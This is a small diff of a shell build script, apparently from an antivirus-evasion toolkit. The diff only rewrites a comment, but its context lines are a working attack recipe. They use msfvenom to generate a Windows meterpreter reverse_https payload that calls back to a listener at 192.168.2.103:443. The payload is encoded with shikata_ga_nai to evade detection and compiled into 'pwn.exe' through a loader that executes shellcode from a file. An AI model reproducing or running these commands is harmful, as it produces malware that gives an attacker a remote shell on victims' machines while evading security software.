@@ -6,7 +6,7 @@
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > sc.bin
-# call make_avet, the -l compiles the filename into the .exe file 
+# call make_avet, -l load and exec shellcode from given file
 ./make_bfg -l
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe bfg.c
